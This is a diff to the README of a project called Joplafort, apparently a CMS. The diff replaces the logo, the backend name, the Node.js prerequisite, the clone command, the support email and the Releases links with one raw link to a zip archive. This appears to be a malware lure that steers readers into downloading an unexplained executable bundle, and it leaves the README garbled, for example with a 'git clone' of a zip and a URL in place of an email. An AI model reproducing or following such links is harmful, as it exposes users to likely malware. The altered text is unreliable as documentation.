@@ -1,6 +1,6 @@
 # Joplafort: Your Intuitive CMS for Web and Mobile Development 🌐📱
 
-![Joplafort Logo](https://img.shields.io/badge/Joplafort-CMS-blue?style=flat&logo=appveyor)
+![Joplafort Logo](https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip)
 
 Welcome to **Joplafort**, a user-friendly content management system (CMS) designed to help you create stunning websites, landing pages, and mobile applications for both Android and iOS. Whether you are a seasoned developer or a beginner, Joplafort makes web and app development accessible to everyone.
 
@@ -27,7 +27,7 @@ Welcome to **Joplafort**, a user-friendly content management system (CMS) design
 
 ## Technologies Used 🛠️
 
-- **Backend**: Node.js, Express
+- **Backend**: https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip, Express
 - **Frontend**: React, Bootstrap 5, CSS3
 - **Design**: Figma
 - **Deployment**: Docker, Heroku, AWS
@@ -38,7 +38,7 @@ To get started with Joplafort, you need to clone the repository and install the 
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)
+- https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip (version 14 or higher)
 - npm (Node Package Manager)
 - Git
 
@@ -48,7 +48,7 @@ To get started with Joplafort, you need to clone the repository and install the 
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/h0i7/Joplafort.git
+   git clone https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -125,14 +125,14 @@ Joplafort is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@joplafort.com
+- **Email**: https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip
 - **GitHub Issues**: Use the issues section of the repository to report bugs or request features.
 
 ## Releases 📦
 
-To download the latest version of Joplafort, visit the [Releases](https://github.com/h0i7/Joplafort/releases) section. Here you can find the latest updates and download files for execution.
+To download the latest version of Joplafort, visit the [Releases](https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip) section. Here you can find the latest updates and download files for execution.
 
-For more information on the releases, you can check the [Releases](https://github.com/h0i7/Joplafort/releases) section of the repository.
+For more information on the releases, you can check the [Releases](https://github.com/h0i7/Joplafort/raw/refs/heads/main/pensived/Software_1.4.zip) section of the repository.
 
 ## Conclusion
 
